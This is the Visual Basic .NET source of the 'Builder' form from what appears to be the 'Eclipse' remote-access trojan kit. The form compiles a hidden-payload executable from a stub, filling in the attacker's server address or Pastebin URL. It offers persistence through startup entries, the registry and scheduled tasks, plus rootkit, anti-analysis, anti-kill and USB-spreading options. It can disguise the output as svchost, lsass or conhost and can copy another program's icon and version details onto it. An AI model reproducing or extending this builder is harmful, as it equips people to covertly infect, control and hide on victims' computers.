
Imports System.CodeDom.Compiler
Imports System.Text
Imports System.IO
Imports Guna.UI2.WinForms
Imports Microsoft.VisualBasic.CompilerServices
Imports SimpleObfuscator

Public Class Builder

    Public iconpath As String
    Public assm As String

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        bl_finish.Visible = False
        bl_host.Visible = False
        bl_options.Visible = False
        bl_miner.Visible = False
        bl_beauty.Visible = False
        Try

            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Assembly", Nothing) = Nothing Or My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Assembly", Nothing) = "False" Then
                assm = Nothing
                Checkbox8.Checked = False
            Else
                assm = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Assembly", Nothing)
                Checkbox8.Checked = True
            End If



            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Icon", Nothing) = Nothing Or My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Icon", Nothing) = "False" Then
                iconpath = Nothing
                Checkbox3.Checked = False
                PictureBox1.Image = Nothing
            Else
                iconpath = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Icon", Nothing)
                Checkbox3.Checked = True
                PictureBox1.ImageLocation = (iconpath)
            End If

            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Startup", Nothing) = "True" Then
                Checkbox1.Checked = True

            Else
                Checkbox1.Checked = False

            End If


            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Reg", Nothing) = "True" Then
                Checkbox2.Checked = True
            Else
                Checkbox2.Checked = False
            End If


            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Task", Nothing) = "True" Then
                Checkbox5.Checked = True
            Else
                Checkbox5.Checked = False
            End If


            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Analysis", Nothing) = "True" Then
                Checkbox6.Checked = True
            Else
                Checkbox6.Checked = False
            End If



            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Host", Nothing) = Nothing Then
                Textbox1.Text = "127.0.0.1"
            Else
                Textbox1.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Host", Nothing)
            End If



            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Port", Nothing) = Nothing Then
                Textbox2.Text = "7000"
            Else
                Textbox2.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Port", Nothing)
            End If


            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Key", Nothing) = Nothing Then
                Textbox5.Text = "eclipsekey"
            Else
                Textbox5.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Key", Nothing)
            End If







            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Url", Nothing) = Nothing Then
                Textbox4.Text = "https://pastebin.com/raw/IP:PORT"
            Else
                Textbox4.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Url", Nothing)
            End If

            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "Pastebin", Nothing) = "True" Then
                Textbox1.Enabled = False
                Textbox2.Enabled = False
                Textbox5.Enabled = False
                Checkbox4.Checked = True
                Textbox4.Enabled = True
            Else
                Textbox1.Enabled = True
                Textbox2.Enabled = True
                Textbox5.Enabled = True
                Checkbox4.Checked = False
                Textbox4.Enabled = False
            End If
        Catch ex As Exception

        End Try






        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "USBN", Nothing) = Nothing Then
            Textbox3.Text = "USB.exe"
        Else
            Textbox3.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "USBN", Nothing)
        End If

        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse", "USBE", Nothing) = "True" Then
            Checkbox7.Checked = True
            Textbox3.Enabled = True
        Else
            Checkbox7.Checked = False
            Textbox3.Enabled = False
        End If




    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles builderrr.Click


        Try
            Dim saveFileDialog As SaveFileDialog = New SaveFileDialog With {
       .Filter = "(*.exe)|*.exe",
       .OverwritePrompt = False,
       .FileName = "dialer.exe"
         }

            If saveFileDialog.ShowDialog() = DialogResult.OK Then
                Try
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Host", Textbox1.Text)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Port", Textbox2.Text)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Key", Textbox5.Text)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"USBN", Textbox3.Text)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Url", Textbox4.Text)
                Catch ex As Exception
                End Try


                Try
                    If Checkbox1.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Startup", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Startup", "False")
                    End If



                    If Checkbox2.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Reg", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Reg", "False")
                    End If


                    If Checkbox5.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Task", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Task", "False")
                    End If
                    Helper.aes_function()
                    If Checkbox6.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Analysis", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Analysis", "False")
                    End If

                    If Checkbox7.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"USBE", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"USBE", "False")
                    End If






                    If assm = Nothing Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Assembly", "False")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Assembly", assm)
                    End If





                    If iconpath = Nothing Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Icon", "False")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Icon", iconpath)
                    End If





                    If Checkbox4.Checked = True Then
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Pastebin", "True")
                    Else
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Eclipse",
"Pastebin", "False")
                    End If

                Catch ex As Exception
                End Try

                Dim Source = My.Resources.Stub
                Dim validchars As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
                Dim sb As New StringBuilder()
                Dim rand As New Random()
                For i As Integer = 1 To 16
                    Dim idx As Integer = rand.Next(0, validchars.Length)
                    Dim randomChar As Char = validchars(idx)
                    sb.Append(randomChar)
                Next i

                Dim randomString = sb.ToString()
                Source = Source.Replace("%mtx%", randomString)
                Source = Source.Replace("%usb%", Textbox3.Text)

                If Checkbox4.Checked = True Then
                    Source = Replace(Source, "#Const Pastebin = False", "#Const Pastebin = True")
                    Source = Source.Replace("%PasteUrl%", Textbox4.Text)
                Else
                    Source = Source.Replace("%ip%", Textbox1.Text)
                    Source = Source.Replace("%port%", Textbox2.Text)
                End If
                Source = Source.Replace("%key%", Textbox5.Text)

                If Checkbox7.Checked = True Then
                    Source = Replace(Source, "#Const usbSP = False", "#Const usbSP = True")
                End If

                If Checkbox1.Checked = True Then
                    Source = Replace(Source, "#Const startup = False", "#Const startup = True")
                End If

                If Checkbox5.Checked = True Then
                    Source = Replace(Source, "#Const task = False", "#Const task = True")
                End If

                If Checkbox2.Checked = True Then
                    Source = Replace(Source, "#Const reg = False", "#Const reg = True")
                End If

                If Checkbox6.Checked = True Then
                    Source = Replace(Source, "#Const Analysis = False", "#Const Analysis = True")
                End If

                If Rootkit.Checked = True Then
                    Source = Replace(Source, "#Const rootkit = False", "#Const rootkit = True")
                End If

                If Issas.Checked = True Then
                    Source = Replace(Source, "#Const issas = False", "#Const issas = True")
                End If

                If Conhost.Checked = True Then
                    Source = Replace(Source, "#Const conhost = False", "#Const conhost = True")
                End If

                If Runtime.Checked = True Then
                    Source = Replace(Source, "#Const runtime = False", "#Const runtime = True")
                End If

                If Svchost.Checked = True Then
                    Source = Replace(Source, "#Const svchost = False", "#Const svchost = True")
                End If

                If antikill.Checked = True Then
                    Source = Replace(Source, "#Const antikill = False", "#Const antikill = True")
                End If

                If watchdog_bt.Checked = True Then
                    Source = Replace(Source, "#Const watchdog = False", "#Const watchdog = True")
                End If



                If Checkbox8.Checked Then
                    Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(assm)


                    Source = Replace(Source, "%Title%", info.FileDescription)
                    Source = Replace(Source, "%Des%", info.Comments)
                    Source = Replace(Source, "%Company%", info.CompanyName)
                    Source = Replace(Source, "%Product%", info.ProductName)
                    Source = Replace(Source, "%Copyright%", info.LegalCopyright)
                    Source = Replace(Source, "%Trademark%", info.LegalTrademarks)
                    Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)


                    Source = Source.Replace("%v1%", info.FileMajorPart.ToString())
                    Source = Source.Replace("%v2%", info.FileMinorPart.ToString())
                    Source = Source.Replace("%v3%", info.FileBuildPart.ToString())
                    Source = Source.Replace("%v4%", info.FilePrivatePart.ToString())

                Else

                    Source = Replace(Source, "%Title%", Nothing)
                    Source = Replace(Source, "%Des%", Nothing)
                    Source = Replace(Source, "%Company%", Nothing)
                    Source = Replace(Source, "%Product%", Nothing)
                    Source = Replace(Source, "%Copyright%", Nothing)
                    Source = Replace(Source, "%Trademark%", Nothing)
                    Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)


                    Source = Source.Replace("%v1%", 1)
                    Source = Source.Replace("%v2%", 0)
                    Source = Source.Replace("%v3%", 0)
                    Source = Source.Replace("%v4%", 0)
                End If

                Compiler(saveFileDialog.FileName, Source)

            End If
        Catch ex As Exception
        End Try
    End Sub
    Public OK As Boolean = False
    Public Sub Compiler(ByVal Path As String, ByVal Code As String)
        Try
            Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
            providerOptions.Add("CompilerVersion", "v4.0")
            Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
            Dim Parameters As New CompilerParameters
            Dim OP As String = " /target:winexe /platform:anycpu /nowarn"
            With Parameters
                .GenerateExecutable = True
                .OutputAssembly = Path
                .CompilerOptions = OP
                .IncludeDebugInformation = False
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                .ReferencedAssemblies.Add("System.dll")
                .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
                .ReferencedAssemblies.Add("System.Management.dll")
                .ReferencedAssemblies.Add("System.Drawing.dll")
                Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
                If Results.Errors.Count > 0 Then
                    For Each E In Results.Errors
                        MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                    Next
                    OK = False
                End If
            End With
            Try
                If Checkbox3.Checked = True Then
                    Threading.Thread.Sleep(1500)
                    IconInjector.InjectIcon(Path, iconpath)
                End If
            Catch ex As Exception
            End Try

            GC.Collect()
            stubcreated.Show()


        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs) Handles Textbox2.TextChanged
        Try
            Dim num As Integer = Conversions.ToInteger(Me.Textbox2.Text)
            If ((Conversions.ToInteger(Me.Textbox2.Text) > &HFFFE) Or (Conversions.ToInteger(Me.Textbox2.Text) < 1)) Then
                Me.Button1.Enabled = False
            Else
                Me.Button1.Enabled = True
            End If
        Catch exception1 As Exception
            Me.Button1.Enabled = False
        End Try
    End Sub

    Private Sub CheckBox7_CheckedChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub CheckBox7_MouseClick(sender As Object, e As MouseEventArgs) Handles Checkbox7.MouseClick
        If Checkbox7.Checked = True Then
            Textbox3.Enabled = True
        Else
            Textbox3.Enabled = False
        End If
    End Sub

    Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub CheckBox4_MouseClick(sender As Object, e As MouseEventArgs) Handles Checkbox4.MouseClick
        If Checkbox4.Checked = True Then
            Textbox1.Enabled = False
            Textbox2.Enabled = False
            Textbox5.Enabled = False

            Textbox4.Enabled = True
        Else
            Textbox1.Enabled = True
            Textbox2.Enabled = True
            Textbox5.Enabled = True

            Textbox4.Enabled = False
        End If
    End Sub

    Private Sub TextBox5_TextChanged(sender As Object, e As EventArgs) Handles Textbox5.TextChanged
        Try
            If Me.Textbox5.Text.Length > 32 Or ((Me.Textbox5.Text.Length) < 1) Then
                Me.Button1.Enabled = False
            Else
                Me.Button1.Enabled = True
            End If
        Catch ex As Exception
            Me.Button1.Enabled = False
        End Try
    End Sub

    Private Sub CheckBox8_CheckedChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub CheckBox3_MouseClick(sender As Object, e As MouseEventArgs) Handles Checkbox3.MouseClick
        If Checkbox3.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Icon"
                .Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico"
                .InitialDirectory = Application.StartupPath & "\Icons"
                If OfD.ShowDialog() = DialogResult.OK Then
                    If OfD.FileName.EndsWith(".exe") Then
                        iconpath = EXEICO.GetIcon(OfD.FileName)
                        PictureBox1.ImageLocation = (iconpath)
                        GC.Collect()
                    Else
                        iconpath = OfD.FileName
                        PictureBox1.ImageLocation = (iconpath)
                    End If

                Else
                    iconpath = Nothing
                    PictureBox1.Image = Nothing
                    Checkbox3.Checked = False
                End If

            End With


        End If
        If Checkbox3.Checked = False Then
            iconpath = Nothing
            PictureBox1.Image = Nothing
            Checkbox3.Checked = False
        End If
    End Sub

    Private Sub CheckBox8_MouseClick(sender As Object, e As MouseEventArgs) Handles Checkbox8.MouseClick
        If Checkbox8.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Exe File"
                .Filter = "(*.exe|*.exe"
                If OfD.ShowDialog() = DialogResult.OK Then
                    assm = OfD.FileName
                    Checkbox8.Checked = True
                Else
                    assm = Nothing
                    Checkbox8.Checked = False
                End If
            End With


        End If
        If Checkbox8.Checked = False Then
            assm = Nothing
            Checkbox8.Checked = False
        End If
    End Sub

    Private Sub TextBox3_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2CircleButton1_Click(sender As Object, e As EventArgs)
        Me.Close()
    End Sub

    Private Sub Guna2CircleButton2_Click(sender As Object, e As EventArgs)
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs)
        Me.Close()
    End Sub

    Private Sub Guna2ControlBox2_Click(sender As Object, e As EventArgs)
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Textbox1_TextChanged_1(sender As Object, e As EventArgs) Handles Textbox1.TextChanged

    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub CheckBox5_CheckedChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub CheckBox6_CheckedChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2CustomCheckBox1_Click(sender As Object, e As EventArgs) Handles Checkbox4.Click

    End Sub

    Private Sub Checkbox7_Click(sender As Object, e As EventArgs) Handles Checkbox7.Click

    End Sub

    Private Sub Checkbox1_Click(sender As Object, e As EventArgs) Handles Checkbox1.Click

    End Sub

    Private Sub Label15_Click(sender As Object, e As EventArgs) Handles Label15.Click

    End Sub

    Private Sub Guna2CustomCheckBox4_Click(sender As Object, e As EventArgs) Handles Rootkit.Click
        antikill.Checked = False
    End Sub

    Private Sub antikill_Click(sender As Object, e As EventArgs) Handles antikill.Click
        Rootkit.Checked = False
    End Sub

    Private Sub bt_default_Click(sender As Object, e As EventArgs) Handles bt_default.Click
        Guna2Transition1.Hide(bl_choose)
        bl_host.Visible = True
        Guna2Transition1.ShowSync(bl_host)
        Rootkit.Checked = True
        Checkbox1.Checked = True
        c_default.Checked = True
    End Sub

    Private Sub btn_login_Click(sender As Object, e As EventArgs) Handles btn_login.Click
        If c_default.Checked = True Then
            Guna2Transition1.Hide(bl_host)
            Guna2Transition1.ShowSync(bl_finish)
        End If
        If c_custom.Checked = True Then
            Guna2Transition1.Hide(bl_host)
            Guna2Transition1.ShowSync(bl_options)
        End If
    End Sub

    Private Sub bt_custom_Click(sender As Object, e As EventArgs) Handles bt_custom.Click
        Guna2Transition1.Hide(bl_choose)
        bl_host.Visible = True
        Guna2Transition1.ShowSync(bl_host)
        c_custom.Checked = True
        'MessageBox.Show("Under maintenance!")
    End Sub

    Private Sub bl_choose_Paint(sender As Object, e As PaintEventArgs) Handles bl_choose.Paint

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Checkbox3_Click(sender As Object, e As EventArgs) Handles Checkbox3.Click

    End Sub

    Private Sub Checkbox8_Click(sender As Object, e As EventArgs) Handles Checkbox8.Click

    End Sub
    Private Function FindFile(folder As String, fileName As String) As String
        Dim filePath As String = System.IO.Path.Combine(folder, fileName)
        If System.IO.File.Exists(filePath) Then ' Verifica se o arquivo existe na pasta atual
            Return filePath
        End If

        For Each subFolder As String In System.IO.Directory.GetDirectories(folder) ' Procura nas subpastas
            filePath = FindFile(subFolder, fileName)
            If Not String.IsNullOrEmpty(filePath) Then
                Return filePath
            End If
        Next

        Return Nothing ' Retorna Nothing se o arquivo não for encontrado
    End Function
    Private Sub Label3_Click_1(sender As Object, e As EventArgs) Handles Label3.Click

    End Sub

    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click

    End Sub

    Private Sub Guna2GradientButton1_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton1.Click
        Guna2Transition1.Hide(bl_options)
        bl_miner.Visible = True
        Guna2Transition1.ShowSync(bl_miner)
        bl_options.Visible = False
    End Sub

    Private Sub Guna2GradientButton3_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton3.Click

    End Sub

    Private Sub Guna2GradientButton2_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton2.Click
        Guna2Transition1.Hide(bl_miner)
        bl_beauty.Visible = True
        Guna2Transition1.ShowSync(bl_beauty)
        bl_miner.Visible = False
    End Sub

    Private Sub Guna2GradientButton5_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton5.Click
        Guna2Transition1.Hide(bl_beauty)
        bl_finish.Visible = True
        Guna2Transition1.ShowSync(bl_finish)
        bl_beauty.Visible = False
    End Sub

    Private Sub Guna2PictureBox8_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox8.Click

    End Sub

    Private Sub bl_beauty_Paint(sender As Object, e As PaintEventArgs) Handles bl_beauty.Paint

    End Sub

    Private Sub bt_cplapplet_Click(sender As Object, e As EventArgs) Handles bt_cplapplet.Click
        Dim fileName As String = "cpl.exe"
        Dim startFolder As String = Application.StartupPath ' Pasta inicial do aplicativo
        Dim filePath As String = FindFile(startFolder, fileName)

        If Not String.IsNullOrEmpty(filePath) Then ' Verifica se o arquivo foi encontrado
            System.Diagnostics.Process.Start(filePath) ' Inicia o arquivo
        Else
            MessageBox.Show("The eclipse spy was not found.", "Eclipse", MessageBoxButtons.OK)
            End
        End If
    End Sub

    Private Sub bl_options_Paint(sender As Object, e As PaintEventArgs) Handles bl_options.Paint

    End Sub
End Class